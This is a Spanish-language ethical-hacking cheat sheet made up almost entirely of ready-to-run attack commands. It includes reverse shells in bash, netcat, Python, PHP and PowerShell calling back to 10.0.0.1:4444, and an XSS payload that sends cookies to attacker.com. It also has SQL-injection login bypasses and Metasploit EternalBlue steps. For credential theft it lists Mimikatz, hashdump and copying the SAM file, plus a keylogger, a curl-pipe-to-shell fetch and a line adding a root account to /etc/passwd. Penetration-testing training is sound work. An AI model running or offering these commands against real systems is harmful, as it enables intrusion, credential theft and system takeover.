# Comandos Útiles para Hacking Ético

## Índice
1. [Reconocimiento](#reconocimiento)
2. [Escaneo de Vulnerabilidades](#escaneo-de-vulnerabilidades)
3. [Explotación](#explotación)
4. [Post-Explotación](#post-explotación)
5. [Cracking de Contraseñas](#cracking-de-contraseñas)
6. [Web Hacking](#web-hacking)
7. [Wireless](#wireless)
8. [Linux Privilege Escalation](#linux-privilege-escalation)
9. [Windows Privilege Escalation](#windows-privilege-escalation)

---

## Reconocimiento

### Nmap
```bash
# Escaneo básico
nmap 192.168.1.1

# Escaneo de todos los puertos
nmap -p- 192.168.1.1

# Escaneo rápido de todos los puertos
nmap -p- --min-rate=1000 192.168.1.1

# Detección de servicios
nmap -sV 192.168.1.1

# Detección de SO
nmap -O 192.168.1.1

# Escaneo agresivo
nmap -A 192.168.1.1

# Scripts de vulnerabilidades
nmap --script vuln 192.168.1.1

# Escaneo UDP
nmap -sU --top-ports 100 192.168.1.1

# Escaneo sigiloso
nmap -sS -T2 -f 192.168.1.1

# Guardar todos los formatos
nmap -oA scan_results 192.168.1.1

# Scripts específicos
nmap --script smb-vuln* 192.168.1.1
nmap --script http-enum 192.168.1.1
```

### DNS
```bash
# Resolución básica
nslookup domain.com
host domain.com
dig domain.com

# Todos los registros
dig domain.com ANY

# Transferencia de zona (si está mal configurado)
dig axfr @ns1.domain.com domain.com

# DNS reverso
dig -x 192.168.1.1

# Subdominios con dnsenum
dnsenum domain.com

# Subdominios con sublist3r
sublist3r -d domain.com

# Subdominios con amass
amass enum -d domain.com
```

### OSINT
```bash
# theHarvester
theHarvester -d domain.com -b all

# Buscar emails con hunter.io
# (requiere API key)

# Google Dorks útiles
site:domain.com
site:domain.com filetype:pdf
site:domain.com inurl:admin
site:domain.com intitle:"index of"
site:domain.com ext:sql | ext:db
```

### Directorios y archivos
```bash
# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

# Ffuf
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302

# Dirb
dirb http://target.com

# Feroxbuster
feroxbuster -u http://target.com -w /usr/share/wordlists/common.txt
```

---

## Escaneo de Vulnerabilidades

### Nikto
```bash
# Escaneo básico
nikto -h http://target.com

# Con autenticación
nikto -h http://target.com -id user:pass

# Guardar reporte
nikto -h http://target.com -o report.html -Format html
```

### OpenVAS
```bash
# Iniciar servicio
gvm-start

# Acceder vía web
# https://localhost:9392
```

### Nessus
```bash
# Iniciar servicio
sudo systemctl start nessusd

# Acceder vía web
# https://localhost:8834
```

---

## Explotación

### Metasploit
```bash
# Iniciar
msfconsole

# Buscar exploits
search type:exploit platform:windows smb
search cve:2021

# Usar módulo
use exploit/windows/smb/ms17_010_eternalblue

# Ver opciones
show options
show payloads

# Configurar
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Ejecutar
exploit
run

# Background session
background

# Ver sesiones
sessions -l

# Interactuar con sesión
sessions -i 1
```

### Searchsploit
```bash
# Buscar exploits
searchsploit apache 2.4
searchsploit wordpress

# Ver exploit
searchsploit -x 12345

# Copiar exploit
searchsploit -m 12345
```

### Shells reversas
```bash
# Bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Netcat
nc -e /bin/bash 10.0.0.1 4444

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Listener
```bash
# Netcat listener
nc -lvnp 4444

# Metasploit listener
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
```

---

## Post-Explotación

### Meterpreter
```
# Info del sistema
sysinfo
getuid
getpid

# Escalada de privilegios
getsystem
getprivs

# Hashes
hashdump

# Mimikatz
load kiwi
creds_all
lsa_dump_sam

# Screenshot
screenshot

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop

# Archivos
download C:\\Users\\admin\\secrets.txt
upload /tmp/malware.exe C:\\temp\\

# Shell
shell

# Persistencia
run persistence -h

# Pivoting
run autoroute -s 192.168.2.0/24
```

### Linux Post-Exploitation
```bash
# Info del sistema
uname -a
cat /etc/issue
cat /etc/*-release
hostname

# Usuarios
whoami
id
cat /etc/passwd
cat /etc/shadow  # requiere root
cat /etc/group

# Red
ip a
netstat -tulpn
ss -tulpn

# Procesos
ps aux
top

# SUID binarios
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Archivos con permisos débiles
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# SSH keys
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Historia
cat ~/.bash_history
cat ~/.zsh_history
```

---

## Cracking de Contraseñas

### John the Ripper
```bash
# Crackear hashes
john hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Formato específico
john --format=raw-md5 hashes.txt
john --format=NT hashes.txt

# Mostrar crackeados
john --show hashes.txt

# Reglas
john --wordlist=wordlist.txt --rules hashes.txt

# /etc/shadow
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt
```

### Hashcat
```bash
# MD5 (-m 0)
hashcat -m 0 hash.txt wordlist.txt

# SHA1 (-m 100)
hashcat -m 100 hash.txt wordlist.txt

# SHA256 (-m 1400)
hashcat -m 1400 hash.txt wordlist.txt

# NTLM (-m 1000)
hashcat -m 1000 hash.txt wordlist.txt

# NetNTLMv2 (-m 5600)
hashcat -m 5600 hash.txt wordlist.txt

# Con reglas
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Mostrar crackeados
hashcat -m 0 hash.txt --show
```

### Hydra (Online)
```bash
# SSH
hydra -l admin -P wordlist.txt ssh://192.168.1.1

# FTP
hydra -l admin -P wordlist.txt ftp://192.168.1.1

# HTTP Basic Auth
hydra -l admin -P wordlist.txt http-get://192.168.1.1/admin

# HTTP POST Form
hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# SMB
hydra -l admin -P wordlist.txt smb://192.168.1.1

# RDP
hydra -l admin -P wordlist.txt rdp://192.168.1.1
```

---

## Web Hacking

### SQL Injection

#### SQLMap
```bash
# Básico
sqlmap -u "http://target.com/page.php?id=1"

# POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Enumerar DBs
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Enumerar tablas
sqlmap -u "http://target.com/page.php?id=1" -D database --tables

# Enumerar columnas
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --columns

# Dump datos
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# Shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

#### Payloads manuales
```sql
-- Bypass login
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
admin'--
admin'#

-- UNION based
' UNION SELECT 1,2,3--
' UNION SELECT null,null,null--
' UNION SELECT username,password FROM users--

-- Time based
' AND SLEEP(5)--
' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)--

-- Error based
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
```

### XSS
```javascript
// Básico
<script>alert('XSS')</script>

// Sin script tags
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

// Event handlers
<div onmouseover="alert('XSS')">Hover me</div>
<input onfocus="alert('XSS')" autofocus>

// Bypass filtros
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

// Cookie stealing
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
```

### Burp Suite Tips
```
# Configurar proxy
Proxy > Options > 127.0.0.1:8080

# Interceptar
Proxy > Intercept > Intercept is on

# Enviar a Repeater
Ctrl+R

# Enviar a Intruder
Ctrl+I

# Decoder
Ctrl+Shift+D
```

---

## Wireless

### Aircrack-ng
```bash
# Ver interfaces
airmon-ng

# Modo monitor
airmon-ng start wlan0

# Escanear redes
airodump-ng wlan0mon

# Capturar handshake específico
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deautenticación
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crackear WPA
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Crackear WEP
aircrack-ng capture-01.cap
```

### Wifite
```bash
# Escanear y atacar automáticamente
wifite

# Solo WPA
wifite --wpa

# Diccionario específico
wifite --dict /path/to/wordlist.txt
```

---

## Linux Privilege Escalation

```bash
# LinPEAS (automated)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Kernel exploits
uname -a
searchsploit linux kernel <version>

# SUID
find / -perm -u=s -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable /etc/passwd
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd

# Sudo
sudo -l
# Si hay (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'

# Cron jobs
cat /etc/crontab
# Si hay script writable en cron

# PATH hijacking
echo $PATH
# Si /tmp está en PATH y ejecutable vulnerable
```

---

## Windows Privilege Escalation

```powershell
# WinPEAS (automated)
.\winPEAS.exe

# Info del sistema
systeminfo
hostname
whoami /all

# Usuarios y grupos
net users
net localgroup administrators
net user username

# Servicios
sc query
wmic service list brief
Get-Service

# Tareas programadas
schtasks /query /fo LIST /v

# Permisos de servicios (buscar Modifiable)
accesschk.exe -ucqv "servicename"

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# SAM y SYSTEM files
copy C:\Windows\System32\config\SAM C:\temp\
copy C:\Windows\System32\config\SYSTEM C:\temp\

# Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
```

---

## Consejos Generales

1. **Siempre documenta** todo lo que haces
2. **Toma screenshots** de evidencia
3. **Guarda logs** de comandos
4. **Ten cuidado** con sistemas en producción
5. **Verifica permisos** antes de actuar
6. **Usa VPN/proxies** cuando sea necesario
7. **Mantén herramientas actualizadas**

---

*Recuerda: Usa estas técnicas SOLO en sistemas donde tengas autorización explícita.*
